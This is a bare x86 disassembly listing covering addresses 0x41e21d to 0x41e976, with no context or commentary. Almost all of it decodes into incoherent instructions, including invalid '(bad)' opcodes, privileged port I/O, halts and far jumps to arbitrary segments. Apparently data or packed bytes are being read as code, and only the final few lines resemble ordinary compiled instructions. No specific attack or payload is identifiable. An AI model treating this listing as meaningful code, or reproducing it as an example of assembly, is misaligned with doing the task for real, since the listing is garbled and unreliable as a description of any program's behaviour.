  41e21d:	sbb    BYTE PTR [ebx-0x1b9d010d],ah
  41e223:	xor    DWORD PTR [edx-0x78],edi
  41e226:	aam    0xa6
  41e228:	pusha  
  41e229:	ret    0x8c47
  41e22c:	neg    DWORD PTR [ebp-0x47]
  41e22f:	pop    esp
  41e230:	push   ebp
  41e231:	retf   
  41e232:	jbe    0x41e267
  41e234:	fsub   QWORD PTR [esi]
  41e236:	shl    DWORD PTR [edi+edi*1-0x27bd3c9c],1
  41e23d:	cwde   
  41e23e:	jae    0x41e1d0
  41e240:	pop    ebx
  41e241:	aad    0x9d
  41e243:	jae    0x41e1d3
  41e245:	inc    edx
  41e246:	add    DWORD PTR [eax-0x72],ecx
  41e249:	out    dx,al
  41e24a:	xor    DWORD PTR [edi],ebp
  41e24c:	push   0xffffffc3
  41e24e:	jp     0x41e2c6
  41e250:	fsubr  DWORD PTR [edi+0x78f58eb8]
  41e256:	push   0x3e
  41e258:	sar    DWORD PTR [ecx+0x1b58860c],1
  41e25e:	sbb    BYTE PTR [eax+0x12edb42d],dl
  41e264:	add    al,0xed
  41e266:	js     0x41e236
  41e268:	add    DWORD PTR [edx-0x31],0x907312a5
  41e26f:	add    dh,dl
  41e271:	inc    eax
  41e272:	jne    0x41e1f9
  41e274:	(bad)  
  41e275:	xchg   esi,eax
  41e276:	lods   al,BYTE PTR ds:[esi]
  41e277:	sub    eax,esp
  41e279:	lods   al,BYTE PTR ds:[esi]
  41e27a:	cmp    eax,0x49587077
  41e27f:	leave  
  41e280:	jp     0x41e214
  41e282:	jmp    0xc61e937
  41e287:	jp     0x41e279
  41e289:	call   FWORD PTR [edi-0x32]
  41e28c:	push   DWORD PTR [edi-0x41]
  41e28f:	fst    QWORD PTR [edx+eiz*8+0x4ac0bf40]
  41e296:	push   ebp
  41e297:	repz hlt 
  41e299:	enter  0xa2bf,0x1a
  41e29d:	pushf  
  41e29e:	test   al,0xe0
  41e2a0:	xchg   BYTE PTR [ecx+ebp*8],cl
  41e2a3:	jnp    0x41e320
  41e2a5:	push   ebx
  41e2a6:	idiv   DWORD PTR [ebp-0x48157b13]
  41e2ac:	out    dx,al
  41e2ad:	sbb    eax,0xdd9f773c
  41e2b2:	call   0xf259cf8f
  41e2b7:	inc    esp
  41e2b8:	daa    
  41e2b9:	pop    eax
  41e2ba:	test   BYTE PTR [eax],0xfa
  41e2bd:	xchg   ebp,eax
  41e2be:	aas    
  41e2bf:	aaa    
  41e2c0:	fs data16 jle 0x41e281
  41e2c4:	push   esi
  41e2c5:	fwait
  41e2c6:	test   al,dh
  41e2c8:	adc    dh,bl
  41e2ca:	in     eax,dx
  41e2cb:	xchg   ebx,eax
  41e2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ce:	pop    ebx
  41e2cf:	push   esp
  41e2d0:	ja     0x41e319
  41e2d2:	cwde   
  41e2d3:	sub    ch,cl
  41e2d5:	int    0x59
  41e2d7:	in     al,dx
  41e2d8:	lods   al,BYTE PTR ds:[esi]
  41e2d9:	lea    edi,[eax-0x72beb0d5]
  41e2df:	and    eax,0x1a81a5ce
  41e2e4:	(bad)  
  41e2e5:	mov    edi,0xa9441cf8
  41e2ea:	(bad)
  41e2ee:	inc    ebp
  41e2ef:	jmp    0x9a019f74
  41e2f4:	push   0xffffffd4
  41e2f6:	mov    edx,DWORD PTR [edi+0x35]
  41e2f9:	mov    ebp,0xf077df88
  41e2fe:	nop
  41e2ff:	inc    esp
  41e300:	jmp    0x8e0f:0xfeb93531
  41e307:	aam    0xff
  41e309:	and    BYTE PTR [ecx+ebp*4+0x1b3b9b36],bl
  41e310:	js     0x41e315
  41e312:	daa    
  41e313:	and    BYTE PTR [ecx+0x36a6bf6a],al
  41e319:	pusha  
  41e31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e31c:	fdiv   QWORD PTR [ebx-0x5edcda4c]
  41e322:	add    ecx,esi
  41e324:	inc    eax
  41e325:	icebp  
  41e326:	jae    0x41e2bc
  41e328:	pop    ecx
  41e329:	xor    dl,dl
  41e32b:	adc    al,0xcc
  41e32d:	rol    BYTE PTR ss:[edi],0x78
  41e331:	std    
  41e332:	xchg   BYTE PTR [esi-0x7951358f],ch
  41e338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e339:	mov    eax,0xdc9c7960
  41e33e:	cdq    
  41e33f:	enter  0x7467,0xf5
  41e343:	cdq    
  41e344:	push   ebp
  41e345:	pushf  
  41e346:	mov    ah,0x8a
  41e348:	rcl    DWORD PTR [ebx],1
  41e34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e34b:	dec    edi
  41e34c:	imul   esi,DWORD PTR [edi],0xdd45bc12
  41e352:	adc    edx,ebp
  41e354:	sahf   
  41e355:	pop    edi
  41e356:	mov    esp,0xab84c85f
  41e35b:	je     0x41e32f
  41e35d:	gs xchg ebp,eax
  41e35f:	jecxz  0x41e358
  41e361:	aam    0x11
  41e363:	in     eax,dx
  41e364:	fstp   QWORD PTR [ecx]
  41e366:	sbb    ebx,DWORD PTR [eax+0x77]
  41e369:	add    ah,BYTE PTR [ecx+0x83ac11e]
  41e36f:	mov    gs,WORD PTR [ecx]
  41e371:	pushf  
  41e372:	sub    al,0xe6
  41e374:	hlt    
  41e375:	and    eax,0x411bd11b
  41e37a:	ja     0x41e373
  41e37c:	xchg   BYTE PTR [edx-0x3a67b3ce],bh
  41e382:	sbb    al,0xb8
  41e384:	xchg   ecx,eax
  41e385:	add    DWORD PTR [edi],ebx
  41e387:	lods   eax,DWORD PTR ds:[esi]
  41e388:	js     0x41e3a9
  41e38a:	ins    DWORD PTR es:[edi],dx
  41e38b:	fdivr  DWORD PTR [edx]
  41e38d:	push   edi
  41e38e:	mov    ecx,0xe894d07b
  41e393:	jp     0x41e3e0
  41e395:	scas   al,BYTE PTR es:[edi]
  41e396:	cmp    BYTE PTR [ebp+0x1a],dh
  41e399:	(bad)  
  41e39a:	iret   
  41e39b:	adc    edi,DWORD PTR [edi-0x3d]
  41e39e:	gs push edx
  41e3a0:	and    ebx,edi
  41e3a2:	icebp  
  41e3a3:	adc    eax,0x6fb39f5f
  41e3a8:	mov    ds:0xa57fcdda,eax
  41e3ad:	pop    es
  41e3ae:	outs   dx,DWORD PTR ds:[esi]
  41e3af:	dec    esp
  41e3b0:	rol    DWORD PTR [ebp+0x6c],0x5c
  41e3b4:	sub    dh,BYTE PTR [eax+ebp*2-0x6b]
  41e3b8:	cmp    esp,edi
  41e3ba:	push   ebx
  41e3bb:	fimul  DWORD PTR [edi-0x182a9a55]
  41e3c1:	mov    edx,0xcadcdf49
  41e3c6:	mov    dh,0x39
  41e3c8:	xchg   esp,ebp
  41e3ca:	mov    ch,0x4e
  41e3cc:	push   eax
  41e3cd:	pop    esi
  41e3ce:	xchg   ebx,eax
  41e3cf:	fs (bad) 
  41e3d1:	repnz adc ch,al
  41e3d4:	stos   BYTE PTR es:[edi],al
  41e3d5:	dec    esi
  41e3d6:	and    cl,BYTE PTR [ebp-0x723047a2]
  41e3dc:	cwde   
  41e3dd:	aaa    
  41e3de:	ins    DWORD PTR es:[edi],dx
  41e3df:	push   es
  41e3e0:	mov    ebx,0xa2212a63
  41e3e5:	mov    ah,0x72
  41e3e7:	push   0xab73c90
  41e3ec:	(bad)  
  41e3ed:	outs   dx,DWORD PTR ds:[esi]
  41e3ee:	les    ebp,FWORD PTR [edx+edi*4]
  41e3f1:	push   eax
  41e3f2:	inc    ebp
  41e3f3:	xlat   BYTE PTR ds:[ebx]
  41e3f4:	rcl    ecx,1
  41e3f6:	mov    bl,0xd0
  41e3f8:	inc    ebp
  41e3f9:	nop
  41e3fa:	(bad)  
  41e3fb:	and    DWORD PTR [edi],edx
  41e3fd:	scas   al,BYTE PTR es:[edi]
  41e3fe:	test   DWORD PTR [edi+0x7b1ef071],0xe658acc
  41e408:	sub    BYTE PTR [ebp-0x1b1051ad],bl
  41e40e:	mov    bh,0x6e
  41e410:	orps   xmm3,xmm7
  41e413:	push   0x89b51dd8
  41e418:	mov    WORD PTR [esi],ds
  41e41a:	lahf   
  41e41b:	stc    
  41e41c:	push   ebp
  41e41d:	mov    esi,0xb25872fb
  41e422:	or     al,0xb1
  41e424:	cmp    esi,esi
  41e426:	pushf  
  41e427:	xchg   esp,eax
  41e428:	loop   0x41e435
  41e42a:	bound  esp,QWORD PTR [ebp-0xd659e4e]
  41e430:	pop    edi
  41e431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e432:	mov    edi,0xebb811a3
  41e437:	int3   
  41e438:	and    al,BYTE PTR [esi+ebx*1-0x76cb2e56]
  41e43f:	hlt    
  41e440:	push   esp
  41e441:	xchg   esi,eax
  41e442:	inc    edi
  41e443:	cmp    al,0x55
  41e445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e446:	adc    esi,DWORD PTR [edx+0x7de6098a]
  41e44c:	inc    ebp
  41e44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e44e:	pushf  
  41e44f:	jl     0x41e41e
  41e451:	sbb    dh,BYTE PTR [ebp+edi*1+0x3a929382]
  41e458:	imul   edx,DWORD PTR [ecx],0xef51712
  41e45e:	mov    cl,0x31
  41e460:	(bad)  
  41e461:	lds    ecx,FWORD PTR [ebp-0x6]
  41e464:	ss push eax
  41e466:	sahf   
  41e467:	sahf   
  41e468:	test   BYTE PTR [esi-0x7d],dl
  41e46b:	mov    dl,0x9f
  41e46d:	lods   eax,DWORD PTR ds:[esi]
  41e46e:	inc    ebx
  41e46f:	xor    DWORD PTR [ebx-0x2dc5f966],edi
  41e475:	pop    edx
  41e476:	rcr    DWORD PTR [esi*1-0x49f9cafc],cl
  41e47d:	mov    edi,0xd923ece5
  41e482:	gs push edx
  41e484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e485:	retf   0xf7c
  41e488:	push   esp
  41e489:	cs xor al,0x81
  41e48c:	neg    BYTE PTR [esi-0x24]
  41e48f:	ss push ss
  41e491:	dec    edi
  41e492:	inc    DWORD PTR [esi]
  41e494:	test   eax,0x20455792
  41e499:	mov    ds:0xb907217b,eax
  41e49e:	retf   
  41e49f:	ffree  st(5)
  41e4a1:	dec    ecx
  41e4a2:	push   ds
  41e4a3:	cmc    
  41e4a4:	dec    edx
  41e4a5:	xor    al,0x44
  41e4a7:	mov    esp,0xed9b48e4
  41e4ac:	pop    edx
  41e4ad:	dec    eax
  41e4ae:	sbb    eax,0x7f98aa23
  41e4b4:	sub    ch,BYTE PTR ds:0xb55064a5
  41e4ba:	mov    eax,0x24564a30
  41e4bf:	sbb    ebx,edi
  41e4c1:	cmp    ah,ah
  41e4c3:	sbb    BYTE PTR [ebx+0x11b27b53],ch
  41e4c9:	cwde   
  41e4ca:	adc    DWORD PTR [ebx],ebx
  41e4cc:	ret    0x178d
  41e4cf:	lods   eax,DWORD PTR ds:[esi]
  41e4d0:	cmp    edi,0xffffff96
  41e4d3:	push   ebp
  41e4d4:	inc    ebp
  41e4d5:	repz mov ch,0x23
  41e4d8:	xor    eax,0x6bdb6154
  41e4dd:	cmp    al,0xae
  41e4df:	call   0x3a048d19
  41e4e4:	ins    DWORD PTR es:[edi],dx
  41e4e5:	cld    
  41e4e6:	pop    ds
  41e4e7:	loopne 0x41e46a
  41e4e9:	cmp    eax,ebp
  41e4eb:	mov    bh,0xa6
  41e4ed:	out    0xd4,al
  41e4ef:	cmp    al,0x4e
  41e4f1:	lods   eax,DWORD PTR ds:[esi]
  41e4f2:	scas   al,BYTE PTR es:[edi]
  41e4f3:	jl     0x41e4aa
  41e4f5:	inc    esi
  41e4f6:	fdiv   QWORD PTR [ecx+0x4dee3562]
  41e4fc:	pop    ebp
  41e4fd:	dec    edx
  41e4fe:	lea    edx,[eax]
  41e500:	adc    eax,0x28d74d4a
  41e505:	sub    cl,BYTE PTR [edx+0x4e68bc7e]
  41e50b:	inc    eax
  41e50c:	js     0x41e568
  41e50e:	mov    ds:0x41e40ca6,al
  41e513:	std    
  41e514:	icebp  
  41e515:	iret   
  41e516:	add    BYTE PTR [ecx+ebx*2],bl
  41e519:	push   0xffffff99
  41e51b:	(bad)  
  41e51c:	push   ecx
  41e51d:	scas   eax,DWORD PTR es:[edi]
  41e51e:	outs   dx,BYTE PTR ds:[esi]
  41e51f:	and    al,bh
  41e521:	cmp    dl,BYTE PTR [ebx-0x1]
  41e524:	sub    DWORD PTR [eax+eax*2+0x53],0x84b0921d
  41e52c:	pop    ebx
  41e52d:	or     DWORD PTR [ebp+0x7],ebx
  41e530:	jge    0x41e552
  41e532:	jo     0x41e4e7
  41e534:	or     ebx,ebx
  41e536:	mov    ecx,DWORD PTR [esi+0x48]
  41e539:	imul   esp,DWORD PTR [edi-0x24],0x52651287
  41e540:	pusha  
  41e541:	mov    BYTE PTR [eax-0x23baac9f],0x1e
  41e548:	sub    al,0xbc
  41e54a:	inc    eax
  41e54b:	jbe    0x41e5c4
  41e54d:	test   eax,0x3ef7f584
  41e552:	jmp    0x9e02:0x5c57c404
  41e559:	cmc    
  41e55a:	and    DWORD PTR [ebp+0x11],0xffffffa7
  41e55e:	cli    
  41e55f:	adc    al,0x95
  41e561:	loopne 0x41e545
  41e563:	imul   ebx,DWORD PTR [ecx+0x37d63ba3],0xffffff93
  41e56a:	dec    eax
  41e56b:	pop    edx
  41e56c:	repnz das 
  41e56e:	lds    esi,FWORD PTR ds:0xcbd5ec85
  41e574:	sbb    esi,DWORD PTR [esp+ebx*2-0x48fe3cbd]
  41e57b:	push   edx
  41e57c:	jbe    0x41e51a
  41e57e:	push   eax
  41e57f:	xchg   edx,eax
  41e580:	mov    bl,0x18
  41e582:	sbb    BYTE PTR [edi-0x5b4a473a],al
  41e588:	lock push esp
  41e58a:	arpl   WORD PTR [ebx+0x73ffc1b6],di
  41e590:	leave  
  41e591:	mov    ebx,0xe9340d7
  41e596:	push   edi
  41e597:	cdq    
  41e598:	test   DWORD PTR [ebp-0x3e896274],edi
  41e59e:	or     DWORD PTR [eax-0x6],0xacabfdea
  41e5a5:	cmp    eax,0x982f24cf
  41e5aa:	rcl    BYTE PTR ds:0x6f636cc6,0x98
  41e5b1:	xor    BYTE PTR ds:0x69d96ef8,dl
  41e5b7:	int3   
  41e5b8:	inc    esp
  41e5b9:	aas    
  41e5ba:	(bad)  
  41e5bb:	dec    ebx
  41e5bc:	add    DWORD PTR [ebp+0x9],esp
  41e5bf:	cdq    
  41e5c0:	add    cl,bl
  41e5c2:	inc    ebx
  41e5c3:	cmp    DWORD PTR [ecx+0x4e0a8397],edi
  41e5c9:	je     0x41e55d
  41e5cb:	cmp    DWORD PTR [esi-0x30],0xfffffff0
  41e5cf:	adc    bl,BYTE PTR [ecx]
  41e5d1:	adc    al,0x9f
  41e5d3:	nop
  41e5d4:	mov    bh,0xe7
  41e5d6:	jmp    0x57cc:0x587e5f67
  41e5dd:	xchg   esi,eax
  41e5de:	iret   
  41e5df:	inc    ebp
  41e5e0:	dec    esi
  41e5e1:	push   eax
  41e5e2:	inc    eax
  41e5e3:	pusha  
  41e5e4:	nop
  41e5e5:	fist   WORD PTR [ebp+0x60fa4f84]
  41e5eb:	icebp  
  41e5ec:	test   al,0x1d
  41e5ee:	xchg   ebx,eax
  41e5ef:	lea    esp,[esi]
  41e5f1:	inc    edi
  41e5f2:	mov    dh,0xff
  41e5f4:	cli    
  41e5f5:	xor    DWORD PTR ds:0xdd9d6266,ebp
  41e5fb:	push   es
  41e5fc:	jns    0x41e582
  41e5fe:	and    edi,DWORD PTR [edi-0x47]
  41e601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e602:	outs   dx,DWORD PTR ds:[esi]
  41e603:	(bad)  
  41e604:	shl    DWORD PTR [ebx-0x3209f0ed],1
  41e60a:	ss jne 0x41e61c
  41e60d:	ret    
  41e60e:	jmp    0xda8c:0xca175092
  41e615:	fistp  DWORD PTR [eax-0x6669d8f4]
  41e61b:	and    bh,ah
  41e61d:	adc    ebp,DWORD PTR [esp+eiz*8+0xe]
  41e621:	mov    ds:0x7767f1e,eax
  41e626:	and    eax,0x809d462a
  41e62b:	loop   0x41e628
  41e62d:	or     dl,BYTE PTR [ecx+0x1]
  41e630:	xchg   ecx,eax
  41e631:	mov    WORD PTR [esi-0x5143daed],?
  41e637:	rcr    DWORD PTR [ecx+0x71],cl
  41e63a:	sbb    eax,0x59a61092
  41e63f:	xlat   BYTE PTR ds:[ebx]
  41e640:	dec    esp
  41e641:	out    0x6c,al
  41e643:	hlt    
  41e644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e645:	jmp    0x41e6af
  41e647:	pop    edi
  41e648:	sub    al,0xb1
  41e64a:	aad    0xd
  41e64c:	push   esp
  41e64d:	pop    esi
  41e64e:	and    cl,bl
  41e650:	push   esi
  41e651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e652:	cdq    
  41e653:	pop    edi
  41e654:	or     eax,0x94316e0c
  41e659:	push   ds
  41e65a:	aaa    
  41e65b:	leave  
  41e65c:	jle    0x41e6a2
  41e65e:	retf   
  41e65f:	mov    cl,0x95
  41e661:	inc    esi
  41e662:	mov    eax,ds:0x4a19b860
  41e667:	mov    al,0x7
  41e669:	mov    BYTE PTR [esi],dl
  41e66b:	dec    ebp
  41e66c:	iret   
  41e66d:	mov    ds:0x6a2635f0,eax
  41e672:	pop    ds
  41e673:	sbb    al,0x74
  41e675:	or     edi,DWORD PTR [ebx+ebp*2-0x4c]
  41e679:	ret    0x838e
  41e67c:	add    eax,0x9c30ce88
  41e681:	stos   DWORD PTR es:[edi],eax
  41e682:	push   edi
  41e683:	mov    al,ds:0x11b9e720
  41e688:	jns    0x41e641
  41e68a:	pusha  
  41e68b:	mov    ah,0x4f
  41e68d:	jae    0x41e616
  41e68f:	sti    
  41e690:	ds int 0xde
  41e693:	fimul  WORD PTR [edi+0x355c74b4]
  41e699:	mov    bl,0xb6
  41e69b:	js     0x41e6b8
  41e69d:	arpl   WORD PTR ds:0x41816633,bp
  41e6a3:	ret    0xb37b
  41e6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6a7:	nop
  41e6a8:	sbb    eax,0x3fb45295
  41e6ad:	xor    al,0xb6
  41e6af:	js     0x41e65c
  41e6b1:	test   eax,0x1c908213
  41e6b6:	dec    eax
  41e6b7:	das    
  41e6b8:	sbb    ecx,ebx
  41e6ba:	popa   
  41e6bb:	xchg   esp,eax
  41e6bc:	inc    edx
  41e6bd:	sub    bh,ah
  41e6bf:	and    bl,bl
  41e6c1:	arpl   WORD PTR [edi+esi*4],dx
  41e6c4:	scas   al,BYTE PTR es:[edi]
  41e6c5:	lds    edi,FWORD PTR [edi-0x2b]
  41e6c8:	push   ecx
  41e6c9:	not    BYTE PTR ds:0xd9ebcef8
  41e6cf:	pop    ds
  41e6d0:	xchg   DWORD PTR [ecx],edx
  41e6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6d3:	and    cl,BYTE PTR [ebx+eiz*4-0x23e94169]
  41e6da:	inc    ebx
  41e6db:	xchg   ebp,eax
  41e6dc:	add    al,0xc0
  41e6de:	mov    fs,WORD PTR [edx+edx*2+0x3f]
  41e6e2:	inc    ebx
  41e6e3:	inc    ecx
  41e6e4:	mov    ds:0x63fba100,al
  41e6e9:	and    esi,esi
  41e6eb:	sub    eax,DWORD PTR [esi]
  41e6ed:	and    DWORD PTR [ebx],esp
  41e6ef:	add    DWORD PTR [edx+0x21],ecx
  41e6f2:	daa    
  41e6f3:	fnstenv [ebp-0x2c]
  41e6f6:	jmp    0x41e74b
  41e6f8:	add    ebp,esi
  41e6fa:	aam    0xa3
  41e6fc:	fwait
  41e6fd:	xlat   BYTE PTR ds:[ebx]
  41e6fe:	cmp    al,0x57
  41e700:	inc    ebx
  41e701:	ins    DWORD PTR es:[edi],dx
  41e702:	ss (bad) 
  41e704:	pushf  
  41e705:	add    BYTE PTR [esi-0x7d],0x55
  41e709:	adc    bl,cl
  41e70b:	sbb    ebx,esp
  41e70d:	rcl    BYTE PTR ds:0xcae8dcbf,cl
  41e713:	in     al,0x1a
  41e715:	mov    WORD PTR [edi],?
  41e717:	jns    0x41e785
  41e719:	aad    0x94
  41e71b:	(bad)  
  41e71c:	int3   
  41e71d:	pusha  
  41e71e:	lock add al,BYTE PTR [ecx]
  41e721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e722:	aam    0x2c
  41e724:	clc    
  41e725:	sbb    ebp,edx
  41e727:	dec    ebx
  41e728:	push   esi
  41e729:	mov    bh,0xd5
  41e72b:	sub    DWORD PTR [ebp+0x443285f0],esi
  41e731:	jecxz  0x41e750
  41e733:	out    dx,al
  41e734:	dec    esp
  41e735:	xlat   BYTE PTR ds:[ebx]
  41e736:	das    
  41e737:	enter  0xac6f,0x18
  41e73b:	bound  edi,QWORD PTR [eax+0x2f1fb8e4]
  41e741:	adc    DWORD PTR [esi-0x5d],ecx
  41e744:	loopne 0x41e796
  41e746:	cmp    bl,BYTE PTR [ecx]
  41e748:	inc    ecx
  41e749:	mov    dh,0x84
  41e74b:	xor    DWORD PTR [ebp+0x12],0x64
  41e74f:	ins    BYTE PTR es:[edi],dx
  41e750:	and    eax,0xb0fe8bad
  41e755:	push   0xffffff9b
  41e757:	gs dec esi
  41e759:	cmp    dl,BYTE PTR [edx-0x45925a43]
  41e75f:	pusha  
  41e760:	adc    al,0x61
  41e762:	scas   al,BYTE PTR es:[edi]
  41e763:	add    DWORD PTR [eax-0x51],edi
  41e766:	gs jp  0x41e71a
  41e769:	pushf  
  41e76a:	int    0x94
  41e76c:	push   0x97bb3398
  41e771:	jnp    0x41e6f7
  41e773:	mov    bh,0xc8
  41e775:	mov    edi,0x6e36a6a6
  41e77a:	push   ebx
  41e77b:	inc    esi
  41e77c:	mov    esi,0x8435b64b
  41e781:	daa    
  41e782:	lock inc esi
  41e784:	adc    al,0xaa
  41e786:	cwde   
  41e787:	or     eax,0xe8871d4e
  41e78c:	sub    BYTE PTR [ebx-0x6e],bh
  41e78f:	add    DWORD PTR [edi],eax
  41e791:	xchg   BYTE PTR [bx-0x393],cl
  41e796:	adc    BYTE PTR [esi+0x7610b861],bl
  41e79c:	sbb    dh,BYTE PTR [ecx-0x240b7613]
  41e7a2:	pop    edx
  41e7a3:	push   ebp
  41e7a4:	push   cs
  41e7a5:	es enter 0x8eff,0xe8
  41e7aa:	jns    0x41e7e0
  41e7ac:	lea    eax,[eax+eiz*8]
  41e7af:	or     eax,ebp
  41e7b1:	jg     0x41e7bf
  41e7b3:	std    
  41e7b4:	(bad)  
  41e7b5:	jmp    0x65df:0xd9c93198
  41e7bc:	test   ecx,ebx
  41e7be:	inc    eax
  41e7bf:	inc    ebp
  41e7c0:	mov    edi,esi
  41e7c2:	mov    ebx,0xd76bca98
  41e7c7:	js     0x41e7ba
  41e7c9:	sbb    eax,0xf098b0ae
  41e7ce:	retf   0x8041
  41e7d1:	sbb    al,0xd6
  41e7d3:	mov    edx,0x500ccb10
  41e7d8:	(bad)  
  41e7d9:	push   edx
  41e7da:	push   esp
  41e7db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7dc:	aam    0xae
  41e7de:	fwait
  41e7df:	or     ch,dh
  41e7e1:	(bad)  
  41e7e2:	fnstenv [ecx-0x2d]
  41e7e5:	and    DWORD PTR [esi],0x61d99bb6
  41e7eb:	push   ss
  41e7ec:	pusha  
  41e7ed:	jg     0x41e78d
  41e7ef:	hlt    
  41e7f0:	push   0xff5e0827
  41e7f5:	aam    0xc8
  41e7f7:	icebp  
  41e7f8:	aaa    
  41e7f9:	setns  BYTE PTR [ecx]
  41e7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7fd:	xor    bh,BYTE PTR [edx+0x6edbb1bb]
  41e803:	inc    ecx
  41e804:	jo     0x41e7b1
  41e806:	mov    eax,0xfc397705
  41e80b:	jmp    0x8c21:0x4344d402
  41e812:	and    al,0x2b
  41e814:	or     al,0x64
  41e816:	pop    es
  41e817:	hlt    
  41e818:	arpl   WORD PTR fs:[esi+0x22],ax
  41e81c:	ins    BYTE PTR es:[edi],dx
  41e81d:	jns    0x41e82d
  41e81f:	jo     0x41e82e
  41e821:	es push ebx
  41e823:	cmc    
  41e824:	mov    bl,BYTE PTR [ecx-0x3071e0c4]
  41e82a:	adc    eax,0x58caf554
  41e82f:	xor    ecx,DWORD PTR [eax-0x7129fda9]
  41e835:	xchg   esi,eax
  41e836:	xchg   esp,eax
  41e837:	xor    DWORD PTR [ecx+0x31],0xffffffa0
  41e83b:	pop    eax
  41e83c:	out    0x5f,al
  41e83e:	and    eax,0xe8795353
  41e843:	popa   
  41e844:	ins    BYTE PTR es:[edi],dx
  41e845:	sub    eax,0x84997888
  41e84a:	dec    ebx
  41e84b:	aaa    
  41e84c:	or     ch,BYTE PTR [eax+0x4d]
  41e84f:	and    DWORD PTR [ebx],ecx
  41e851:	xor    eax,0xf9791978
  41e856:	les    eax,FWORD PTR [eax]
  41e858:	retf   
  41e859:	aam    0xff
  41e85b:	add    esp,DWORD PTR [ebx-0x162db26e]
  41e861:	adc    eax,0xe24e90b1
  41e866:	dec    ecx
  41e867:	aam    0xf8
  41e869:	xchg   BYTE PTR [ebp+0x4d],dl
  41e86c:	(bad)  
  41e86d:	aam    0x2a
  41e86f:	push   eax
  41e870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e871:	stc    
  41e872:	sub    edx,DWORD PTR [edi+0x35]
  41e875:	push   ss
  41e876:	cmc    
  41e877:	jno    0x41e853
  41e879:	push   0x761079f6
  41e87e:	repz mov al,ds:0x4c7fcd87
  41e884:	fimul  WORD PTR [ebx-0x5a43f0a0]
  41e88a:	mov    bl,0xd1
  41e88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e88e:	in     eax,0x6e
  41e890:	mov    bl,0xd6
  41e892:	stos   DWORD PTR es:[edi],eax
  41e893:	jmp    0xdc95af4e
  41e898:	xchg   ecx,eax
  41e899:	pop    ds
  41e89a:	dec    edx
  41e89b:	push   0xffffff99
  41e89d:	iret   
  41e89e:	out    0x86,al
  41e8a0:	dec    esp
  41e8a1:	pop    eax
  41e8a2:	test   al,0x8c
  41e8a4:	dec    edx
  41e8a5:	shl    BYTE PTR [eax+ebx*2],0x3a
  41e8a9:	pop    ebx
  41e8aa:	cmp    esp,DWORD PTR [eax]
  41e8ac:	push   eax
  41e8ad:	add    ch,ah
  41e8af:	xor    BYTE PTR [eax-0x5c17691d],bl
  41e8b5:	adc    BYTE PTR [esi+0xc],0xdd
  41e8b9:	and    al,0xf6
  41e8bb:	and    eax,0xcc8431e8
  41e8c0:	and    eax,0xfeac1484
  41e8c5:	push   ebx
  41e8c6:	inc    esi
  41e8c7:	sub    cl,BYTE PTR ds:0xeb869aff
  41e8cd:	pop    ebx
  41e8ce:	shl    ecx,1
  41e8d0:	mov    esi,DWORD PTR [ecx+0x3c]
  41e8d3:	or     BYTE PTR [esi+eax*4],bl
  41e8d6:	in     eax,0xb5
  41e8d8:	mov    ebx,0x4a1dc798
  41e8dd:	pop    ss
  41e8de:	pop    ebp
  41e8df:	dec    eax
  41e8e0:	cmp    al,0x8a
  41e8e2:	rcr    BYTE PTR [esi-0x69d29219],0x26
  41e8e9:	lods   eax,DWORD PTR ds:[esi]
  41e8ea:	lds    edx,FWORD PTR [ecx+0x45]
  41e8ed:	out    dx,eax
  41e8ee:	and    al,0xa
  41e8f0:	or     DWORD PTR [ecx+0x58dfa9e3],edx
  41e8f6:	or     al,0x18
  41e8f8:	fdivr  QWORD PTR [ecx+0x7b19925c]
  41e8fe:	sub    al,0x60
  41e900:	in     al,dx
  41e901:	std    
  41e902:	rcr    DWORD PTR [edx+0x2827773b],cl
  41e908:	and    al,0x20
  41e90a:	iret   
  41e90b:	enter  0xb975,0x64
  41e90f:	(bad)  
  41e910:	aaa    
  41e911:	repnz daa 
  41e913:	ins    BYTE PTR es:[edi],dx
  41e914:	xchg   ebx,eax
  41e915:	fbld   TBYTE PTR [edx+0x25]
  41e918:	je     0x41e8ca
  41e91a:	cmp    esi,DWORD PTR [esi+0x4dca782a]
  41e920:	out    dx,eax
  41e921:	movnti DWORD PTR [eax+0xa307f0e],edx
  41e928:	retf   0xd8a7
  41e92b:	mov    BYTE PTR [edx],ch
  41e92d:	dec    edx
  41e92e:	pop    ebx
  41e92f:	outs   dx,BYTE PTR ds:[esi]
  41e930:	jmp    0xb79c:0xab721cbe
  41e937:	push   ss
  41e938:	outs   dx,BYTE PTR ds:[esi]
  41e939:	imul   eax,esi,0x12
  41e93c:	inc    edi
  41e93d:	ins    BYTE PTR es:[edi],dx
  41e93e:	call   0x88d6d101
  41e943:	lock and eax,0xd958f189
  41e949:	sti    
  41e94a:	dec    edi
  41e94b:	dec    eax
  41e94c:	xor    edx,eax
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
